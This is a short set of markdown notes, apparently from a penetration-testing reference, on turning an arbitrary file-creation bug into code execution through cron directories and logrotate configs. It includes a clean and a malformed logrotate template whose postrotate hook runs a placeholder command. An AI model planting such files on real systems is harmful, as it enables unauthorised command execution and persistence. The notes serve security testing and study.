# Create Arbitrary File
These notes apply when you found a bug where:
* as root or user you can...
	* create an empty file
	* create file and control content (eg. arbitrary file upload)
	* create file and partially control content (eg. inject data into a config file)
		* control filename/path
		* partially control filename or path (eg. fixed extension)


### cronjob /etc/cron.daily
* create a file in `/etc/cron.daily/`
* requires `root` permissions
* executed through `crontab` via `run-parts`
	* file **must** be executable.
	* shell script or binary works

### cronjob via /etc/cron.d/pwn
* create a file in `/etc/cron.d/pwn`
* requires `root` permissions
* file syntax the same as in [crontab](../file-append/README.md#crontab)

### logrotate
* requires `root` permissions
* on Ubuntu 22.04 LTS `logrotate` is executed daily through `/etc/cron.daily/logrotate`
* logrotate config files in `/etc/logrotate.d/<anything>`
* consideres time in `/var/lib/logrotate/status` to determin if log should be rotated (you might have to wait for two days for a new file to trigger a first rotate)
* comment lines start with `# a comment`
* newlines are required! Format is strict
* unkown commands are ignored

#### Clean File
```
/etc/debian_version {
       hourly
       copy
       ifempty
       missingok 
       postrotate /usr/bin/touch /tmp/testrotate 
       endscript
}
```

#### Messy File
```
text and <00><ff>binary is okay here, but must not start with a [symbol]!@#

/etc/debian_version {
       thishere must be valid word at the start. symbols can appear [later!@] but not at the start!
       # a comment with # is similar to invalid command. anything can follow until newline \n (even binary)
       hourly
       copy
       ifempty
       missingok 
       postrotate /usr/bin/touch /tmp/testrotate 
       endscript
}

# comment here
xxxx {
asdas
}

[we]! can have symbols and garbage at the end
<00><ff> binary also ok here
```